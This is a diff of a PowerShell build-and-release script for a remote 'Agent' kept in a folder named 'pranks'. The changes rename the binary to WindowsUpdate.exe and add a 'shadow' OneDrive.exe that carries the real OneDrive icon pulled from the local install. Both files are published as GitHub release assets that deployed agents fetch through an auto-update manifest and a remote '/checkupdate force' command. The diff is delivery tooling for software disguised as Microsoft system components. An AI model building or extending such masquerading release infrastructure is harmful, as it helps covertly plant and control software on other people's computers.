@@ -1,11 +1,18 @@
-# release.ps1 — build homeCtrl + update manifest.json + git commit/push + GitHub Release
-# Auto-installs git, gh CLI, and dotnet SDK via winget if missing.
+# release.ps1 - build WindowsUpdate.exe + OneDrive.exe (shadow) + update manifest.json
+# + git commit/push + GitHub Release. Auto-installs git, gh CLI, dotnet SDK, and
+# ImageMagick via winget if missing. Fetches a OneDrive-cloud PNG from the
+# configured URL and converts it into a multi-resolution .ico the OneDrive build
+# embeds as its application icon.
+#
+# ASCII-only script body: PowerShell 5.1 reads .ps1 files without a BOM as the
+# system ANSI codepage. Any non-ASCII character becomes mojibake and the parser
+# then rejects follow-on tokens. Keep comments and strings pure ASCII.
 #
 # Usage:
-#   .\release.ps1 -Version 1.2.3
-#   .\release.ps1 -Version 1.2.3 -Notes "Fix screenshot bug"
-#   .\release.ps1 -Version 1.2.3 -SkipBuild
-#   .\release.ps1 -Version 1.2.3 -SkipUpload
+#   .\release.ps1 -Version 1.0.23
+#   .\release.ps1 -Version 1.0.23 -Notes "First dual-exe release"
+#   .\release.ps1 -Version 1.0.23 -SkipBuild
+#   .\release.ps1 -Version 1.0.23 -SkipUpload
 
 param(
     [Parameter(Mandatory=$true)] [string] $Version,
@@ -16,20 +23,28 @@ param(
 
 $ErrorActionPreference = "Stop"
 
-# Paths — adjust if repo layout changes
-$agentSource = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
-$exePath     = Join-Path $agentSource "publish_out\homeCtrl.exe"
-$manifestDir = $PSScriptRoot
-$manifestPath = Join-Path $manifestDir "manifest.json"
+# ---------------- Paths ----------------
+$agentSource         = "C:\Users\mohba\OneDrive\Desktop\pranks\Agent\Source"
+$primaryExe          = Join-Path $agentSource "publish_out\WindowsUpdate.exe"
+$shadowExe           = Join-Path $agentSource "publish_out_shadow\OneDrive.exe"
+$manifestDir         = $PSScriptRoot
+$manifestPath        = Join-Path $manifestDir "manifest.json"
+$iconDest            = Join-Path $agentSource "Assets\OneDrive.ico"
 
-# GitHub repo (owner/name). Change if you fork or rename.
+# ---------------- Icon source config ----------------
+# Primary source: extract the icon directly from the local Microsoft OneDrive
+# install (every Windows 10/11 system Microsoft ships ships with it) via
+# System.Drawing.Icon.ExtractAssociatedIcon. This avoids depending on an
+# external CDN and gets the official OneDrive icon rather than a Wikipedia logo.
+$iconLocalSource     = Join-Path $env:LOCALAPPDATA "Microsoft\OneDrive\OneDrive.exe"
+
+# ---------------- GitHub repo ----------------
 $ghOwner = "sayamuhbani59-collab"
 $ghRepo  = "homectrl-updates"
 
-function Fail($msg) { Write-Host "❌ $msg" -ForegroundColor Red; exit 1 }
+function Fail($msg) { Write-Host "[FAIL] $msg" -ForegroundColor Red; exit 1 }
 
 function Refresh-Path {
-    # Reload PATH from registry so freshly installed tools become findable in this session.
     $env:Path = [System.Environment]::GetEnvironmentVariable("Path", "Machine") + ";" +
                 [System.Environment]::GetEnvironmentVariable("Path", "User")
 }
@@ -43,101 +58,157 @@ function Ensure-Tool {
     $exists = Get-Command $Command -ErrorAction SilentlyContinue
     if ($exists) { return }
 
-    Write-Host "🔧 $DisplayName nicht gefunden — installiere via winget ($WingetId)..." -ForegroundColor Yellow
+    Write-Host "[INST] $DisplayName not found - installing via winget ($WingetId)..." -ForegroundColor Yellow
 
     $winget = Get-Command winget -ErrorAction SilentlyContinue
     if (-not $winget) {
-        Fail "winget nicht verfügbar. Installiere $DisplayName manuell oder update Windows (App Installer)."
+        Fail "winget not available. Install $DisplayName manually or update Windows (App Installer)."
     }
 
     winget install --id $WingetId --exact --silent --accept-source-agreements --accept-package-agreements | Out-Host
-    if ($LASTEXITCODE -ne 0) {
-        Fail "winget install $WingetId fehlgeschlagen (exit $LASTEXITCODE)"
+    # Exit code -1978335189 = APPINSTALLER_CLI_ERROR_UPDATE_NOT_APPLICABLE: the
+    # package is already installed and up-to-date. That is fine for us - just
+    # refresh PATH and recheck.
+    if ($LASTEXITCODE -ne 0 -and $LASTEXITCODE -ne -1978335189) {
+        Fail "winget install $WingetId failed (exit $LASTEXITCODE)"
     }
 
     Refresh-Path
 
     $recheck = Get-Command $Command -ErrorAction SilentlyContinue
     if (-not $recheck) {
-        Fail "$DisplayName installiert, aber '$Command' immer noch nicht im PATH. Terminal/Session neu starten und nochmal versuchen."
+        Fail "$DisplayName installed but '$Command' still not on PATH. Restart terminal and retry."
     }
-    Write-Host "✅ $DisplayName installiert" -ForegroundColor Green
+    Write-Host "[OK]   $DisplayName installed" -ForegroundColor Green
+}
+
+function Compute-Sha256 {
+    param([Parameter(Mandatory=$true)] [string] $Path)
+    return (Get-FileHash -Algorithm SHA256 -LiteralPath $Path).Hash.ToLower()
 }
 
 # ---------------- Prerequisites (auto-install) ----------------
-Write-Host "🔍 Checking prerequisites..." -ForegroundColor Cyan
-Ensure-Tool -Command "git" -WingetId "Git.Git" -DisplayName "Git"
-Ensure-Tool -Command "dotnet" -WingetId "Microsoft.DotNet.SDK.8" -DisplayName ".NET 8 SDK"
-Ensure-Tool -Command "gh" -WingetId "GitHub.cli" -DisplayName "GitHub CLI"
+Write-Host "[CHECK] Prerequisites..." -ForegroundColor Cyan
+# Pull latest PATH from registry so tools installed by winget in a previous
+# session are visible to this one without a terminal restart.
+Refresh-Path
+Ensure-Tool -Command "git"     -WingetId "Git.Git"                 -DisplayName "Git"
+Ensure-Tool -Command "dotnet"  -WingetId "Microsoft.DotNet.SDK.8"  -DisplayName ".NET 8 SDK"
+Ensure-Tool -Command "gh"      -WingetId "GitHub.cli"              -DisplayName "GitHub CLI"
+# ImageMagick not needed anymore - icon is extracted directly from OneDrive.exe.
 
-# gh needs auth once — check
-$ghStatus = & gh auth status 2>&1
+# Don't use 2>&1 on native commands: PS 5.1 wraps every stderr line as a
+# NativeCommandError which, combined with $ErrorActionPreference=Stop, halts the
+# script even on exit code 0. Discard stderr with 2>$null and check $LASTEXITCODE.
+gh auth status 2>$null | Out-Null
 if ($LASTEXITCODE -ne 0) {
-    Write-Host "🔐 gh CLI nicht eingeloggt — starte 'gh auth login'..." -ForegroundColor Yellow
-    Write-Host "   Wähle: GitHub.com → HTTPS → Yes (authenticate git) → Login with browser" -ForegroundColor Yellow
+    Write-Host "[AUTH] gh CLI not logged in - starting 'gh auth login'..." -ForegroundColor Yellow
+    Write-Host "       Pick: GitHub.com -> HTTPS -> Yes (authenticate git) -> Login with browser" -ForegroundColor Yellow
     gh auth login
-    if ($LASTEXITCODE -ne 0) { Fail "gh auth login abgebrochen — kann kein Release erstellen." }
+    if ($LASTEXITCODE -ne 0) { Fail "gh auth login aborted - cannot create release." }
 }
 
-# ---------------- 1) Build ----------------
+# ---------------- 1) Icon extraction from local OneDrive.exe (idempotent) --------
+if (-not (Test-Path $iconDest)) {
+    $assetsDir = Split-Path -Parent $iconDest
+    if (-not (Test-Path $assetsDir)) { New-Item -ItemType Directory -Force $assetsDir | Out-Null }
+    if (-not (Test-Path $iconLocalSource)) {
+        Write-Host "[ICON] Local OneDrive not found at $iconLocalSource - OneDrive.csproj will build with default .NET icon (ApplicationIcon tag is conditional)." -ForegroundColor Yellow
+    } else {
+        Write-Host "[ICON] Extracting icon from local OneDrive.exe..." -ForegroundColor Cyan
+        try {
+            Add-Type -AssemblyName System.Drawing -ErrorAction Stop
+            $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($iconLocalSource)
+            if ($null -eq $icon) { Fail "ExtractAssociatedIcon returned null" }
+            try {
+                $fs = [System.IO.File]::Create($iconDest)
+                try { $icon.Save($fs) } finally { $fs.Close() }
+            } finally { $icon.Dispose() }
+            Write-Host "       -> $iconDest" -ForegroundColor Green
+        } catch {
+            Fail "Icon extraction failed: $($_.Exception.Message)"
+        }
+    }
+} else {
+    Write-Host "[ICON] Icon present ($iconDest) - skip extract." -ForegroundColor DarkGray
+}
+
+# ---------------- 2) Build primary (WindowsUpdate.exe) ----------------
 if (-not $SkipBuild) {
-    Write-Host "🔨 Building homeCtrl.exe (self-contained, single-file, win-x64)..." -ForegroundColor Cyan
+    Write-Host "[BUILD] WindowsUpdate.exe (primary, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
     Push-Location $agentSource
     try {
-        dotnet publish -c Release -o .\publish_out -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Null
-        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish failed" }
+        dotnet publish Agent.csproj -c Release -o .\publish_out -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
+        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish Agent.csproj failed" }
+    }
+    finally { Pop-Location }
+
+    Write-Host "[BUILD] OneDrive.exe (shadow, self-contained, single-file, win-x64)..." -ForegroundColor Cyan
+    Push-Location $agentSource
+    try {
+        dotnet publish OneDrive.csproj -c Release -o .\publish_out_shadow -p:PublishSingleFile=true -r win-x64 --self-contained true | Out-Host
+        if ($LASTEXITCODE -ne 0) { Fail "dotnet publish OneDrive.csproj failed" }
     }
     finally { Pop-Location }
 }
 
-if (-not (Test-Path $exePath)) { Fail "exe not found: $exePath" }
+if (-not (Test-Path $primaryExe)) { Fail "primary exe not found: $primaryExe" }
+if (-not (Test-Path $shadowExe))  { Fail "shadow exe not found: $shadowExe" }
 
-# ---------------- 2) SHA-256 + size ----------------
-Write-Host "🔑 Computing SHA-256..." -ForegroundColor Cyan
-$hash = (certutil -hashfile $exePath SHA256 | Select-Object -Index 1).Trim().ToLower()
-$size = (Get-Item $exePath).Length
-Write-Host "   sha256 = $hash"
-Write-Host "   size   = $size bytes ($([math]::Round($size/1MB,1)) MB)"
+# ---------------- 3) SHA-256 + size (both exes) ----------------
+Write-Host "[HASH]  Computing SHA-256..." -ForegroundColor Cyan
+$primaryHash = Compute-Sha256 -Path $primaryExe
+$primarySize = (Get-Item $primaryExe).Length
+$shadowHash  = Compute-Sha256 -Path $shadowExe
+$shadowSize  = (Get-Item $shadowExe).Length
+$primaryMb = [math]::Round($primarySize/1MB, 1)
+$shadowMb  = [math]::Round($shadowSize/1MB, 1)
+Write-Host ("        primary sha256 = {0}  ({1} MB)" -f $primaryHash, $primaryMb)
+Write-Host ("        shadow  sha256 = {0}  ({1} MB)" -f $shadowHash,  $shadowMb)
 
-# ---------------- 3) Update manifest.json ----------------
-Write-Host "📝 Updating manifest.json..." -ForegroundColor Cyan
-$downloadUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/homeCtrl.exe"
-$manifest = @{
-    version = $Version
-    sha256  = $hash
-    url     = $downloadUrl
-    notes   = $Notes
+# ---------------- 4) Update manifest.json ----------------
+Write-Host "[MANI] Updating manifest.json..." -ForegroundColor Cyan
+$primaryUrl = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/WindowsUpdate.exe"
+$shadowUrl  = "https://github.com/$ghOwner/$ghRepo/releases/download/v$Version/OneDrive.exe"
+$manifest = [ordered]@{
+    version      = $Version
+    sha256       = $primaryHash
+    url          = $primaryUrl
+    shadowSha256 = $shadowHash
+    shadowUrl    = $shadowUrl
+    notes        = $Notes
 } | ConvertTo-Json -Depth 4
 Set-Content -Path $manifestPath -Value $manifest -Encoding utf8
-Write-Host "   -> $manifestPath"
+Write-Host "       -> $manifestPath"
 
-# ---------------- 4) Git commit + push ----------------
-Write-Host "📦 git add + commit + push manifest..." -ForegroundColor Cyan
+# ---------------- 5) Git commit + push ----------------
+Write-Host "[GIT]  add + commit + push manifest..." -ForegroundColor Cyan
 Push-Location $manifestDir
 try {
-    git add manifest.json README.md .gitignore release.ps1 2>&1 | Out-Null
+    git add manifest.json README.md .gitignore release.ps1 2>$null | Out-Null
     $status = git status --porcelain
     if ($status) {
-        git commit -m "release v$Version" | Out-Null
+        git commit -m "release v$Version (dual exe: WindowsUpdate + OneDrive shadow)" | Out-Null
         git push
-        if ($LASTEXITCODE -ne 0) { Fail "git push failed — remote/credentials prüfen" }
-        Write-Host "   -> pushed to $ghOwner/$ghRepo main" -ForegroundColor Green
+        if ($LASTEXITCODE -ne 0) { Fail "git push failed - check remote/credentials" }
+        Write-Host "       -> pushed to $ghOwner/$ghRepo main" -ForegroundColor Green
     } else {
-        Write-Host "   (no changes to commit)" -ForegroundColor Yellow
+        Write-Host "       (no changes to commit)" -ForegroundColor Yellow
     }
 }
 finally { Pop-Location }
 
-# ---------------- 5) GitHub Release + Exe Upload ----------------
+# ---------------- 6) GitHub Release + Exe Upload (both assets) ----------------
 if ($SkipUpload) {
-    Write-Host "⏭ SkipUpload gesetzt — Release manuell anlegen:" -ForegroundColor Yellow
-    Write-Host "   https://github.com/$ghOwner/$ghRepo/releases/new  →  Tag v$Version  →  $exePath"
+    Write-Host "[SKIP] SkipUpload set - create release manually:" -ForegroundColor Yellow
+    Write-Host "       https://github.com/$ghOwner/$ghRepo/releases/new  ->  Tag v$Version"
+    Write-Host "       Assets: $primaryExe  +  $shadowExe"
     exit 0
 }
 
-Write-Host "🚀 GitHub Release v$Version + Exe upload via gh CLI..." -ForegroundColor Cyan
+Write-Host "[REL]  GitHub Release v$Version + 2 asset uploads via gh CLI..." -ForegroundColor Cyan
 $notesArg = if ([string]::IsNullOrWhiteSpace($Notes)) { "Release v$Version" } else { $Notes }
-gh release create "v$Version" $exePath --title "v$Version" --notes $notesArg
+gh release create "v$Version" $primaryExe $shadowExe --title "v$Version" --notes $notesArg
 if ($LASTEXITCODE -ne 0) { Fail "gh release create failed" }
-Write-Host "✅ Release v$Version live" -ForegroundColor Green
-Write-Host "   Agents pullen innerhalb autoUpdateIntervalMinutes. Sofort: /checkupdate force" -ForegroundColor Green
+Write-Host "[OK]   Release v$Version live" -ForegroundColor Green
+Write-Host "       Agents pull within autoUpdateIntervalMinutes. Trigger now: /checkupdate force" -ForegroundColor Green
